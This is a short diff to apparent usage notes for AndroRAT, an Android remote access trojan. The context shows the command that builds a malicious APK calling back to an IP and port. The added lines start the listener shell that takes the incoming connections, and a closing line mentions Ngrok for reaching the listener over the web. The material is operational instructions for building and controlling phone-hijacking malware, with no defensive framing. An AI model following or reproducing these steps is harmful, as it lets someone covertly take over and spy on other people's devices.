@@ -9,6 +9,9 @@ sudo apt install zipalign # install only if is neccesary
 cd ~/AndroRAT
 python3 androRAT.py --build -i 192.168.2.12 -p 4444 -o testlocal.apk
 
+* To listen connections
+python3 androRat.py --shell -i 0.0.0.0 -p 4444
+
 
 - Ngrock install for web use
 Using apt
